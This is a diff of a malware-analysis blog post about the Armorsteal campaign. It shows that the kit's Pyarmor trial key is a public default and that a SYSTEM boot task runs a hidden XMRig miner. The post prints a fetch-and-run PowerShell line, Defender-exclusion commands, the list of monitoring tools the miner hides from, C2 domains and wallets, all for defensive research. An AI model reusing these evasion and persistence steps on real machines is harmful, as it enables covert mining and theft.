@@ -2,7 +2,7 @@
 title: "Armorsteal's Pyarmor key is the shared trial key, and its boot task starts a miner"
 date: 2026-11-14T13:37:32+00:00
 slug: "armorsteal-pyarmor-trial-miner"
-description: "Armorsteal's three Pyarmor-protected packages opened with the shared trial key: a SYSTEM boot task that runs an XMRig handler instead of the remote access module, two miner configs and wallets, the hash table that pins every package, the task-signing key, the clipper's 13 wallets, and a config extractor."
+description: "Armorsteal's Pyarmor scripts all open with the shared trial key, and its SYSTEM boot task runs an XMRig miner handler, not the remote access module."
 tags: ["armorsteal", "pyarmor", "python", "xmrig", "clipper", "seo-poisoning", "windows"]
 sample:
   family: "Armorsteal (remote access package Update.zip)"
@@ -11,16 +11,26 @@ sample:
 toc: true
 ---
 
-Armorsteal's boot-time scheduled task, the one that runs as SYSTEM, doesn't start the remote access module. It starts `xm_handler.py`, which adds `C:\Windows` to Microsoft Defender's exclusions, downloads a hash-pinned XMRig build with its pools compiled in, and stops mining whenever one of 20 monitoring tools is open. Every Python script in the kit is protected with Pyarmor's trial edition, and the trial runtimes in all three packages give the same AES key: the default that a public unpacker already carries for trial builds. So the scripts open without running anything, and the miner, its two wallets, the task-signing key and the clipper's 13 replacement addresses come out of the bytecode.
+Armorsteal's boot-time scheduled task, the one that runs as SYSTEM, doesn't start the remote access module. It starts `xm_handler.py`, which adds `C:\Windows` to Microsoft Defender's exclusions, downloads a hash-pinned XMRig build with its pools compiled in, and stops mining whenever one of 20 monitoring tools is open.
 
-Zscaler's Threat Hunting team [named Armorsteal](https://www.zscaler.com/blogs/security-research/seo-poisoning-campaign-delivers-new-armorsteal-malware) on October 22 (Nashid P): fake Chocolatey and Microsoft Activation Scripts (MAS) sites that hand visitors a PowerShell one-liner, and a Python 3.11 kit with remote access, surveillance and stealer modules. The report covers the C2 endpoints, the signed-task scheme, the surveillance and stealer features and the infrastructure, and says the scripts are "protected with Pyarmor 9.1.7 (trial version)". It doesn't mention a miner. None of its 10 file hashes is on MalwareBazaar; six are on Hybrid Analysis, and I took four of them: the MAS installer and the three module packages. Three more files are pinned by hash inside the kit itself, and all three are on Hybrid Analysis (one also on MalwareBazaar), as is an older remote access package on MalwareBazaar. A [bare IOC list](https://github.com/starmtp/IOCs/blob/6acfa1e1a6c5a60358111e7aa5224ed99c28dd04/RAT-XMRig.txt) by starmtp, committed on September 11, already names `xm_handler.py`, the custom miner's hash and `averageguardian[.]net` (plus `goodboys[.]top[.]net`, one label off from the real `goodboys[.]top`); it has no analysis, keys or wallets. The scripts were decrypted with [Pyarmor-Static-Unpack-1shot](https://github.com/Lil-House/Pyarmor-Static-Unpack-1shot) and read as disassembly.
+Every Python script in the kit is protected with Pyarmor's trial edition, and the trial runtimes in all three packages give the same AES key: the default that a public unpacker already carries for trial builds. So the scripts open without running anything, and the miner, its two wallets, the task-signing key and the clipper's 13 replacement addresses come out of the bytecode.
+
+Zscaler's Threat Hunting team [named Armorsteal](https://www.zscaler.com/blogs/security-research/seo-poisoning-campaign-delivers-new-armorsteal-malware) on October 22 (Nashid P). The campaign uses fake Chocolatey and Microsoft Activation Scripts (MAS) sites that hand visitors a PowerShell one-liner, and a Python 3.11 kit with remote access, surveillance and stealer modules.
+
+Two public sources already had parts of this:
+
+- Zscaler's report covers the C2 endpoints, the signed-task scheme, the surveillance and stealer features and the infrastructure. It says the scripts are "protected with Pyarmor 9.1.7 (trial version)". It doesn't mention a miner.
+- A [bare IOC list](https://github.com/starmtp/IOCs/blob/6acfa1e1a6c5a60358111e7aa5224ed99c28dd04/RAT-XMRig.txt) by starmtp, committed on September 11, already names `xm_handler.py`, the custom miner's hash and `averageguardian[.]net` (plus `goodboys[.]top[.]net`, one label off from the real `goodboys[.]top`). It has no analysis, keys or wallets.
+
+None of the report's 10 file hashes is on MalwareBazaar. Six are on Hybrid Analysis, and I took four of them: the MAS installer and the three module packages. Three more files are pinned by hash inside the kit itself, and all three are on Hybrid Analysis (one also on MalwareBazaar), as is an older remote access package on MalwareBazaar.
 
 ## What I found
 
-- The MAS installer registers `SysCheckX` (at startup, 45-second delay, SYSTEM) to run `xm_handler.py`. Zscaler's table says that task launches the remote access module. The handler keeps an XMRig 6.26.0 build running with a Defender exclusion for all of `C:\Windows`, kills it while Task Manager, Process Explorer, Wireshark or 17 other tools run, and reinstalls it when its pinned hash changes.
-- The three Pyarmor runtimes were generated by three Pyarmor releases (8.4.7, 8.5.0, 8.5.1, per their package headers) and all yield AES key `ab738f35ffce23b13ae73d5a2c17a896`. The key is derived from license data that, for the trial, contains nothing specific to the user, and it is the default that 1shot ships, so these scripts decrypt without their runtime.
-- The remote access module pins each package it downloads by SHA-256, and the table links the files: the surveillance and stealer packages, an XMRig zip, and `configf.json`, the file Zscaler describes as the C2 liveness probe, which is an XMRig config.
-- Two miner configs use two Monero wallets on `auto.c3pool[.]org` and five proxy addresses on port 8880. The surveillance module's clipper carries 13 addresses for 9 coins, and its screenshot XOR key (which Zscaler gave) is the SHA-256 of a ten-letter slur.
+- The MAS installer's boot task, `SysCheckX`, runs `xm_handler.py` as SYSTEM. Zscaler's table says that task launches the remote access module.
+- The handler keeps an XMRig 6.26.0 build running, excludes all of `C:\Windows` from Defender, and kills the miner while any of 20 monitoring tools runs.
+- All three Pyarmor runtimes, from releases 8.4.7, 8.5.0 and 8.5.1, yield AES key `ab738f35ffce23b13ae73d5a2c17a896`. It's the trial default that the 1shot unpacker ships, so these scripts decrypt without their runtime.
+- The remote access module pins each package it downloads by SHA-256. One pinned file, `configf.json`, which Zscaler describes as the C2 liveness probe, is an XMRig config.
+- Two miner configs use two Monero wallets on `auto.c3pool[.]org` and five proxy addresses on port 8880. The clipper carries 13 addresses for 9 coins.
 - Pyarmor stamps every script with its obfuscation time. They run from 2025-02-25 to 2026-09-16, so parts of the kit are 18 months older than the campaign.
 
 ## What the MAS installer actually runs
@@ -39,7 +49,9 @@ $xmPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAcc
 iex (irm 'https://get.activated.win')                                                                                          # (2)
 ```
 
-`SysCheck2` matches Zscaler's description. `SysCheckX` at (1) runs a different script, `xm_handler.py`, which ships in the same `Update.zip` next to `SysMon.py`. Both tasks get `ExecutionTimeLimit` set to zero, with a comment explaining that Task Scheduler would otherwise kill them after three days. At (2) the script runs the real MAS one-liner, so the victim gets the activation script they were looking for. The Chocolatey installer (`fb118116…`) isn't on either sample site, so I can't say whether it registers the same `SysCheckX`.
+`SysCheck2` matches Zscaler's description. `SysCheckX` at (1) runs at startup, after a 45-second delay, as SYSTEM, and it runs a different script: `xm_handler.py`, which ships in the same `Update.zip` next to `SysMon.py`. Both tasks get `ExecutionTimeLimit` set to zero, with a comment explaining that Task Scheduler would otherwise kill them after three days.
+
+At (2) the script runs the real MAS one-liner, so the victim gets the activation script they were looking for. The Chocolatey installer (`fb118116…`) isn't on either sample site, so I can't say whether it registers the same `SysCheckX`.
 
 ## The Pyarmor layer opens with the trial's default key
 
@@ -51,7 +63,13 @@ from pyarmor_runtime_000000 import __pyarmor__
 __pyarmor__(__name__, __file__, b'PY000000\x00\x03\x0b\x00\xa7\r\r\n\x80...')
 ```
 
-`000000` is the license number, and the header marks it as the trial. Pyarmor's [license page](https://pyarmor.readthedocs.io/en/v9.1.3/licenses.html) says every license has a unique number of the form `pyarmor-vax-xxxxxx`. The blob after `PY000000` is the encrypted code object. Its key lives in `pyarmor_runtime.pyd`. 1shot's `runtime.py` derives it as MD5 over three fields read from the runtime (the license string `pyarmor-vax-000000`, an RSA public key, and a product block starting `i.non-profits`) plus a fixed certificate. A paid license has its own number, so its key differs. The trial's fields carry nothing about the user, which is why 1shot ships a built-in default for trial runtimes. I checked runtimes from 8.4.7, 8.5.0 and 8.5.1 only; a later Pyarmor release could change the trial's fields. The three runtimes in these packages have different file hashes and come from three Pyarmor releases, and all three give that default:
+`000000` is the license number, and the header marks it as the trial. Pyarmor's [license page](https://pyarmor.readthedocs.io/en/v9.1.3/licenses.html) says every license has a unique number of the form `pyarmor-vax-xxxxxx`. The blob after `PY000000` is the encrypted code object, and its key lives in `pyarmor_runtime.pyd`.
+
+The scripts were decrypted with [Pyarmor-Static-Unpack-1shot](https://github.com/Lil-House/Pyarmor-Static-Unpack-1shot) and read as disassembly. 1shot's `runtime.py` derives the key as MD5 over three fields read from the runtime, plus a fixed certificate. The three fields are the license string `pyarmor-vax-000000`, an RSA public key, and a product block starting `i.non-profits`.
+
+A paid license has its own number, so its key differs. The trial's fields carry nothing about the user, which is why 1shot ships a built-in default for trial runtimes. I checked runtimes from 8.4.7, 8.5.0 and 8.5.1 only; a later Pyarmor release could change the trial's fields.
+
+The three runtimes in these packages have different file hashes and come from three Pyarmor releases (per their package headers), and all three give that default:
 
 ```text
 default ab738f35ffce23b13ae73d5a2c17a896 692e6e6f6e2d70726f666974
@@ -60,7 +78,9 @@ steal   ab738f35ffce23b13ae73d5a2c17a896 000000 True
 surv    ab738f35ffce23b13ae73d5a2c17a896 000000 True
 ```
 
-The second value is the nonce for Pyarmor's string encryption, the bytes `i.non-profit`. Zscaler calls the trial "operationally useful to the threat actor because it provides code obfuscation without requiring a commercial Pyarmor license". It also gives the defender the key. G DATA's [Pyarmor v8+ write-up](https://cyber.wtf/2025/02/12/unpacking-pyarmor-v8-scripts) explains the format; 1shot implements it. I built 1shot from source and pointed it at each package. It decrypted all 18 protected scripts (17 distinct files; `test20.py` ships in two packages) and wrote a disassembly and a partial decompilation for each.
+The second value is the nonce for Pyarmor's string encryption, the bytes `i.non-profit`. Zscaler calls the trial "operationally useful to the threat actor because it provides code obfuscation without requiring a commercial Pyarmor license". It also gives the defender the key.
+
+G DATA's [Pyarmor v8+ write-up](https://cyber.wtf/2025/02/12/unpacking-pyarmor-v8-scripts) explains the format; 1shot implements it. I built 1shot from source and pointed it at each package. It decrypted all 18 protected scripts (17 distinct files; `test20.py` ships in two packages) and wrote a disassembly and a partial decompilation for each.
 
 The decompiler gave up inside most functions, so the facts below come from the disassembly, which 1shot's README calls accurate where the decompilation may not be. The header timestamps, collected from all 18:
 
@@ -79,7 +99,9 @@ The stamps carry no time zone, so I only use them for order. Zscaler first saw t
 
 ## The remote access module pins every package by hash
 
-`SysMon.py` lists the four C2 domains in priority order (`workerstats[.]net`, `niceer[.]net`, `datamons[.]org`, `supertrap[.]net`, all on 443) and hands them to a `DomainManager` class whose docstring survived Pyarmor: "Priority-based domain failover with automatic failback." Docstrings survive throughout, because they are string constants that Pyarmor encrypts along with the code and 1shot decrypts back, and so do the comments inside the Python source strings the module runs with `exec`. They make the reading easy.
+`SysMon.py` lists the four C2 domains in priority order: `workerstats[.]net`, `niceer[.]net`, `datamons[.]org`, `supertrap[.]net`, all on 443. It hands them to a `DomainManager` class whose docstring survived Pyarmor: "Priority-based domain failover with automatic failback."
+
+Docstrings survive throughout, because they are string constants that Pyarmor encrypts along with the code and 1shot decrypts back. So do the comments inside the Python source strings the module runs with `exec`. They make the reading easy.
 
 Before running anything it downloads, the module checks it against a table:
 
@@ -93,9 +115,20 @@ Before running anything it downloads, the module checks it against a table:
 814  STORE_NAME  47: VERIFIED_HASHES
 ```
 
-The first two are the surveillance and stealer packages from Zscaler's list. The other two weren't in the report, and both are public: `xmrig6.26-v2.zip` on [MalwareBazaar](https://bazaar.abuse.ch/sample/253653f645b9c89e7e7e7e967926b0cf0f9adda98ac9d6ba4aa1eb354d80ab9d/) and `configf.json` on Hybrid Analysis. `/downloadables/configf.json` is the path `SysMon.py`, `basrq.py` and `got.py` request to check whether a domain is alive; Zscaler's table describes it as "Checks whether the C2 server is available based on the HTTP status code 200." The pinned file at that name is an XMRig config with three pools. Nothing in `SysMon.py` uses the last two entries, and the miner handler pins a different zip. The XMRig zip in this table was on Hybrid Analysis by June 6, 2026, three months before the campaign Zscaler saw, and its `config.json` is dated April 28. I think the entries are left over from an earlier way of delivering the miner, from before `xm_handler.py` existed. That is an inference from the table and those dates, not from any task I've seen.
+The first two are the surveillance and stealer packages from Zscaler's list. The other two weren't in the report, and both are public: `xmrig6.26-v2.zip` on [MalwareBazaar](https://bazaar.abuse.ch/sample/253653f645b9c89e7e7e7e967926b0cf0f9adda98ac9d6ba4aa1eb354d80ab9d/) and `configf.json` on Hybrid Analysis.
 
-The older `Update.zip` on [MalwareBazaar](https://bazaar.abuse.ch/sample/d89ba5767848eb5597d03a1d0ae30cc451050859fbc3b9fd3095a9474dd7d86b/) (first seen September 13, tag `fakemas`) holds an earlier `SysMon.py`, obfuscated on September 1. Its table maps `nigf.zip` to `04d28281…` and `getthemf.zip` to `56f05c4f…`, and its code downloads them from `/downloadables/nig20083.zip` and `/downloadables/getthem20083.zip`. `nig` is the surveillance package (it unpacks to `nig\basrq.py`), so `04d28281…` is the older surveillance package. Zscaler's table lists it as "Older stealer module". The two builds also differ in the download code, and the later one adds the OEM-placeholder checks on the motherboard serial: the September 16 build resumes interrupted downloads with `Range` requests (the docstring blames a CDN that "aborts responses to slow or briefly-stalled clients") and waits (up to an hour) for the surveillance package to finish before it fetches the stealer.
+`/downloadables/configf.json` is the path `SysMon.py`, `basrq.py` and `got.py` request to check whether a domain is alive. Zscaler's table describes it as "Checks whether the C2 server is available based on the HTTP status code 200." The pinned file at that name is an XMRig config with three pools.
+
+Nothing in `SysMon.py` uses the last two entries, and the miner handler pins a different zip. The XMRig zip in this table was on Hybrid Analysis by June 6, 2026, three months before the campaign Zscaler saw, and its `config.json` is dated April 28. I think the entries are left over from an earlier way of delivering the miner, from before `xm_handler.py` existed. That is an inference from the table and those dates, not from any task I've seen.
+
+The older `Update.zip` on [MalwareBazaar](https://bazaar.abuse.ch/sample/d89ba5767848eb5597d03a1d0ae30cc451050859fbc3b9fd3095a9474dd7d86b/) (first seen September 13, tag `fakemas`) holds an earlier `SysMon.py`, obfuscated on September 1. Its table maps `nigf.zip` to `04d28281…` and `getthemf.zip` to `56f05c4f…`. Its code downloads them from `/downloadables/nig20083.zip` and `/downloadables/getthem20083.zip`.
+
+`nig` is the surveillance package (it unpacks to `nig\basrq.py`), so `04d28281…` is the older surveillance package. Zscaler's table lists it as "Older stealer module".
+
+The two builds also differ in the download code, and the later one adds the OEM-placeholder checks on the motherboard serial. The September 16 build:
+
+- resumes interrupted downloads with `Range` requests (the docstring blames a CDN that "aborts responses to slow or briefly-stalled clients")
+- waits (up to an hour) for the surveillance package to finish before it fetches the stealer
 
 ### Signed tasks
 
@@ -107,7 +140,13 @@ n_hex_prefix 0xb6e69915b6df303107724b3e8049b6a0
 spki_sha256 c9189c37e1104308b10a12e5b0e68f31a5529e748893af408bcae31bce01b069
 ```
 
-`verify_signature` is a hand-written PKCS #1 v1.5 check: `pow(sig, e, n)`, then `00 01`, a run of `FF`, `00`, the SHA-256 DigestInfo prefix, and a comparison with `SHA-256(code.encode('utf-8'))`. The per-victim endpoint (`/get-onetime-code/<id>`) returns JSON with `code` in plain text; the global one (`/get-global`) returns text whose last line starting with `# __SIGNED__:` carries JSON with base64 `code`. A task runs only if the integer in its `ONETIME_VERSION = N` or `GLOBAL_VERSION = N` line is higher than the one saved in `onetime_version.txt` or `global_version.txt`. A per-victim task then runs through `exec(compile(code, '<agent>', 'exec'), {})`, in an empty namespace. A global task runs through `exec(compile(code, '<global>', 'exec'), globals())`, so it can call anything the module defines, the hash-checked downloader included. Zscaler described this scheme; the key and the exact checks are what the disassembly adds. Without the private key nobody else can push a task to an infected machine, and the SPKI hash above is a way to recognize this operator's agents if the key turns up in other builds.
+`verify_signature` is a hand-written PKCS #1 v1.5 check: `pow(sig, e, n)`, then `00 01`, a run of `FF`, `00`, the SHA-256 DigestInfo prefix, and a comparison with `SHA-256(code.encode('utf-8'))`.
+
+The per-victim endpoint (`/get-onetime-code/<id>`) returns JSON with `code` in plain text. The global one (`/get-global`) returns text whose last line starting with `# __SIGNED__:` carries JSON with base64 `code`.
+
+A task runs only if the integer in its `ONETIME_VERSION = N` or `GLOBAL_VERSION = N` line is higher than the one saved in `onetime_version.txt` or `global_version.txt`. A per-victim task then runs through `exec(compile(code, '<agent>', 'exec'), {})`, in an empty namespace. A global task runs through `exec(compile(code, '<global>', 'exec'), globals())`, so it can call anything the module defines, the hash-checked downloader included.
+
+Zscaler described this scheme; the key and the exact checks are what the disassembly adds. Without the private key nobody else can push a task to an infected machine. The SPKI hash above is a way to recognize this operator's agents if the key turns up in other builds.
 
 ## xm_handler.py keeps a miner running as SYSTEM
 
@@ -124,7 +163,11 @@ DEFENDER_EXCLUSION_PATH = 'C:\\Windows'
 MONITORING_TOOLS = {'anvir.exe', 'resmon.exe', 'fiddler.exe', 'perfmon.exe', 'procexp.exe', ...}   # 20 names
 ```
 
-Its main loop wakes once a second. If any process name is in `MONITORING_TOOLS`, it kills every `xmrig.exe` and skips the rest. Otherwise, at most once a minute, `ensure_defender_exclusion` reads `(Get-MpPreference).ExclusionPath` and, if `C:\Windows` is missing, runs `Add-MpPreference -ExclusionPath 'C:\Windows'` and `Add-MpPreference -ExclusionProcess 'xmrig.exe'`. If the exclusion is in place, or Defender isn't active, the loop makes sure the miner is installed and starts `xmrig-v2\xmrig.exe` with no arguments and `CREATE_NO_WINDOW`. Installation means downloading the zip from `/downloadables/` on each C2 in turn, checking its SHA-256 against `XMRIG_ZIP_HASH`, extracting it with `tar`, and writing the hash to `xmrig_installed.hash`; a different hash in that marker file triggers a reinstall, which the docstring calls a "miner upgrade". The 20 tools:
+Its main loop wakes once a second. If any process name is in `MONITORING_TOOLS`, it kills every `xmrig.exe` and skips the rest.
+
+Otherwise, at most once a minute, `ensure_defender_exclusion` reads `(Get-MpPreference).ExclusionPath`. If `C:\Windows` is missing, it runs `Add-MpPreference -ExclusionPath 'C:\Windows'` and `Add-MpPreference -ExclusionProcess 'xmrig.exe'`. If the exclusion is in place, or Defender isn't active, the loop makes sure the miner is installed and starts `xmrig-v2\xmrig.exe` with no arguments and `CREATE_NO_WINDOW`.
+
+Installation means downloading the zip from `/downloadables/` on each C2 in turn and checking its SHA-256 against `XMRIG_ZIP_HASH`. The handler then extracts it with `tar` and writes the hash to `xmrig_installed.hash`. A different hash in that marker file triggers a reinstall, which the docstring calls a "miner upgrade". The 20 tools:
 
 `anvir.exe`, `autoruns.exe`, `autoruns64.exe`, `autorunsc.exe`, `autorunsc64.exe`, `fiddler.exe`, `perfmon.exe`, `processhacker.exe`, `processlasso.exe`, `procexp.exe`, `procexp64.exe`, `procexp64a.exe`, `procmon.exe`, `procmon64.exe`, `procmon64a.exe`, `resmon.exe`, `systeminformer.exe`, `taskmgr.exe`, `tcpview.exe`, `wireshark.exe`.
 
@@ -132,7 +175,9 @@ That's the reason the boot task runs as SYSTEM: adding Defender exclusions needs
 
 ### Two miner builds, two wallets
 
-The pinned `xmrig-6.26-v2-cs-2.zip` ([Hybrid Analysis](https://www.hybrid-analysis.com/sample/4a39f7a37ef2f81e6e75ec7dd931392b49dd3016ff8ede651f57e9344b1eeb4e), submitted September 16) holds only `xmrig.exe` and `WinRing0x64.sys`. With no `config.json` and no arguments, the binary has to carry its own config, and it does: a JSON document at file offset 4,074,369 in a 5,005,824-byte custom build that reports itself as `XMRig 6.26.0`. The older `xmrig-6.26-v2.zip` (the one in `SysMon.py`'s table) holds the official 6.26.0 Windows build (its `xmrig.exe` matches the one in XMRig's `windows-x64` release zip, `6fa80698…`) with the `config.json` replaced; the release's own `SHA256SUMS` file, left in the folder, still lists the original config's hash. The pools:
+The pinned `xmrig-6.26-v2-cs-2.zip` ([Hybrid Analysis](https://www.hybrid-analysis.com/sample/4a39f7a37ef2f81e6e75ec7dd931392b49dd3016ff8ede651f57e9344b1eeb4e), submitted September 16) holds only `xmrig.exe` and `WinRing0x64.sys`. With no `config.json` and no arguments, the binary has to carry its own config, and it does: a JSON document at file offset 4,074,369 in a 5,005,824-byte custom build that reports itself as `XMRig 6.26.0`.
+
+The older `xmrig-6.26-v2.zip` (the one in `SysMon.py`'s table) holds the official 6.26.0 Windows build with the `config.json` replaced. Its `xmrig.exe` matches the one in XMRig's `windows-x64` release zip, `6fa80698…`. The release's own `SHA256SUMS` file, left in the folder, still lists the original config's hash. The pools:
 
 | build | pool | user |
 |---|---|---|
@@ -168,7 +213,9 @@ Wallet A is `88biyCZR3vaKtYrtUWzBxbd94NuwvW15tGxNfpCjDxMPKo2XQ2a6CEbLixDuZY3uaoX
 
 Solana comes last because its pattern, any 32 to 44 base58 characters, would match most of the others. Clipboard text that matches nothing goes into the keylog.
 
-The screenshot cipher is `out[i] = png[i] ^ k[i % 32]` with `k = SHA-256(FIXED_PASSWORD)`. Zscaler published the key, `c1146fbc…`. The string behind it is a ten-letter racial slur, which I won't reprint; its SHA-256 is that key. `SysMon.py` identifies the machine by its motherboard serial (or 32 random hex characters if the serial looks like an OEM placeholder) and saves it in `machine_id.txt`, which the other modules read; `basrq.py` stores it in a variable named `MAC_ADDRESS`, which it isn't.
+The screenshot cipher is `out[i] = png[i] ^ k[i % 32]` with `k = SHA-256(FIXED_PASSWORD)`. Zscaler published the key, `c1146fbc…`. The string behind it is a ten-letter racial slur, which I won't reprint; its SHA-256 is that key.
+
+`SysMon.py` identifies the machine by its motherboard serial, or 32 random hex characters if the serial looks like an OEM placeholder. It saves the ID in `machine_id.txt`, which the other modules read. `basrq.py` stores it in a variable named `MAC_ADDRESS`, which it isn't.
 
 ## The stealer checks for the miner's exclusion
 
@@ -181,7 +228,15 @@ The screenshot cipher is `out[i] = png[i] ^ k[i % 32]` with `k = SHA-256(FIXED_P
 ' is excluded from Defender. Proceeding immediately...'
 ```
 
-So the stealer knows about the exclusion that `xm_handler.py` maintains and gives it 80 seconds to appear; it carries on either way. It then downloads `chrome-injector-v0.17.4.zip` from xaitax's [Chrome App-Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) releases on GitHub and runs `chromelevator_x64.exe` from it; the older `newst.py` in the same package points at version 0.10.0 of the same project. Zscaler covers the stealer's targets well, and I have little to add except what the package doesn't use. `getst.py`, `getws.py`, `newst.py` (May 2025), `test20.py` (the Chrome DevTools cookie grabber on port 9222) and, in the surveillance package, the three fake wallet notification scripts are shipped and decrypt fine, but no string, import or command line in `got.py`, `basrq.py`, their helpers or `SysMon.py` names them. Nothing in these builds starts them, though a global task could. I think most are leftovers that ship because the operator zips the whole folder.
+So the stealer knows about the exclusion that `xm_handler.py` maintains and gives it 80 seconds to appear; it carries on either way. It then downloads `chrome-injector-v0.17.4.zip` from xaitax's [Chrome App-Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) releases on GitHub and runs `chromelevator_x64.exe` from it. The older `newst.py` in the same package points at version 0.10.0 of the same project.
+
+Zscaler covers the stealer's targets well, and I have little to add except what the package doesn't use. These scripts are shipped and decrypt fine:
+
+- `getst.py`, `getws.py` and `newst.py` (May 2025)
+- `test20.py` (the Chrome DevTools cookie grabber on port 9222)
+- in the surveillance package, the three fake wallet notification scripts
+
+No string, import or command line in `got.py`, `basrq.py`, their helpers or `SysMon.py` names them. Nothing in these builds starts them, though a global task could. I think most are leftovers that ship because the operator zips the whole folder.
 
 ## A config extractor
 
@@ -189,7 +244,11 @@ The [extractor](https://github.com/stateless-re/tools/tree/main/families/armorst
 
 ## Wrong turns
 
-My first constant dumper skipped any string that looked like a Python identifier, to drop names from the listing. A hex hash that starts with a letter looks like an identifier. The table came out with three hashes, `be0329d0…` (the stealer package) missing, and for a while I believed the stealer package wasn't pinned at all, which would have been an odd gap in an otherwise careful loader. The `BUILD_CONST_KEY_MAP` instruction takes four values, and there were only three in my output. Reading the disassembly directly showed the fourth. The dumper now reads only `[Constants]` sections and keeps everything in them.
+My first constant dumper skipped any string that looked like a Python identifier, to drop names from the listing. A hex hash that starts with a letter looks like an identifier.
+
+The table came out with three hashes, `be0329d0…` (the stealer package) missing. For a while I believed the stealer package wasn't pinned at all, which would have been an odd gap in an otherwise careful loader.
+
+The `BUILD_CONST_KEY_MAP` instruction takes four values, and there were only three in my output. Reading the disassembly directly showed the fourth. The dumper now reads only `[Constants]` sections and keeps everything in them.
 
 The other one was trusting the report's task table. I had written "SysCheckX launches the remote access module" into my notes before opening the 3 KB installer that says otherwise.
 
